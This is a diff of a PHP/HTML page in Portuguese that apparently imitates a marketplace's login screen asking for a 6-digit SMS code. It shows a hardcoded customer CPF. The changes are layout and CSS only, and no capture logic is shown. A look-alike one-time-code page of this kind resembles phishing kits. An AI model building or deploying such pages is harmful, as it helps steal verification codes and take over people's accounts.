@@ -1,12 +1,11 @@
 <?php
 // --- DADOS DO CLIENTE (EXEMPLO) ---
-// No seu sistema real, estes dados viriam do banco de dados.
 $identificador_cliente = '28811419867';
-$tipo_identificador = 'CPF'; // Poderia ser 'E-mail' ou 'Telefone'
+$tipo_identificador = 'CPF'; 
 
 // Função para formatar o CPF
 function formatarCPF($cpf) {
-    $cpf = preg_replace('/[^0-9]/', '', $cpf); // Remove qualquer caractere não numérico
+    $cpf = preg_replace('/[^0-9]/', '', $cpf);
     if (strlen($cpf) != 11) {
         return "CPF inválido";
     }
@@ -20,7 +19,6 @@ function formatarCPF($cpf) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código SMS</title>
     <style>
-        /* Estilo básico para o corpo da página */
         body {
             margin: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
@@ -28,13 +26,13 @@ function formatarCPF($cpf) {
             color: #333;
         }
 
-        /* Estilo do cabeçalho (mantido como estava) */
         .main-header {
             background-color: #ffe600;
             height: 60px;
             display: flex;
             align-items: center;
-            padding-left: 650px; /* Posição do logo ajustada */
+            /* O padding é ajustado para alinhar com o conteúdo abaixo */
+            padding: 0 48px; 
         }
 
         .main-header img {
@@ -44,12 +42,22 @@ function formatarCPF($cpf) {
         /* Container principal para alinhar o conteúdo */
         .main-content {
             padding-top: 80px;
-            padding-left: 650px; /* Mesmo padding do header para alinhar */
+            flex-grow: 1; /* Garante que o main ocupe o espaço disponível */
         }
         
+        /* NOVO: Wrapper para centralizar o layout de colunas */
+        .content-wrapper {
+            max-width: 960px; /* Largura máxima do conteúdo total */
+            margin: 0 auto; /* Centraliza o wrapper na página */
+            display: flex; /* Ativa flexbox */
+            justify-content: center; /* Centraliza as colunas filhas */
+            gap: 64px; /* Espaço entre a coluna da esquerda e a futura da direita */
+        }
+
         /* Estilos para a coluna da esquerda */
         .left-column {
-            width: 340px; /* Largura fixa como no exemplo */
+            width: 340px; /* Largura fixa para a coluna de texto */
+            flex-shrink: 0; /* Impede que a coluna encolha */
         }
 
         .session-start-label {
@@ -61,7 +69,7 @@ function formatarCPF($cpf) {
 
         .main-title {
             font-size: 28px;
-            font-weight: 400; /* Peso mais leve, como na imagem */
+            font-weight: 400;
             margin: 8px 0 16px 0;
         }
 
@@ -73,11 +81,12 @@ function formatarCPF($cpf) {
         }
 
         .user-info-box {
-            display: flex;
+            /* MUDANÇA: inline-flex faz a caixa se ajustar ao conteúdo */
+            display: inline-flex; 
             align-items: center;
             gap: 12px;
             border: 1px solid #e0e0e0;
-            border-radius: 6px; /* Bordas arredondadas */
+            border-radius: 25px; /* Bordas arredondadas */
             padding: 12px;
             margin-bottom: 24px;
         }
@@ -85,7 +94,7 @@ function formatarCPF($cpf) {
         .user-info-box .icon {
             width: 32px;
             height: 32px;
-            background-color: #eaf3ff; /* Fundo azul claro para o ícone */
+            background-color: #eaf3ff;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -100,7 +109,7 @@ function formatarCPF($cpf) {
 
         .user-info-box .details a {
             font-size: 12px;
-            color: #3483fa; /* Cor azul para o link */
+            color: #3483fa;
             text-decoration: none;
         }
 
@@ -119,26 +128,30 @@ function formatarCPF($cpf) {
     </header>
 
     <main class="main-content">
-        <div class="left-column">
-            <span class="session-start-label">INÍCIO DE SESSÃO</span>
-            <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
-            <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>
+        <div class="content-wrapper">
+            
+            <div class="left-column">
+                <span class="session-start-label">INÍCIO DE SESSÃO</span>
+                <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
+                <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>
 
-            <div class="user-info-box">
-                <div class="icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
+                <div class="user-info-box">
+                    <div class="icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <div class="details">
+                        <span><?php echo $tipo_identificador . ': ' . formatarCPF($identificador_cliente); ?></span>
+                        <a href="#">Trocar conta</a>
+                    </div>
                 </div>
-                <div class="details">
-                    <span><?php echo $tipo_identificador . ': ' . formatarCPF($identificador_cliente); ?></span>
-                    <a href="#">Trocar conta</a>
-                </div>
+
+                <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
-            <a href="#" class="help-link">Preciso de ajuda</a>
-        </div>
+            </div>
     </main>
 
 </body>
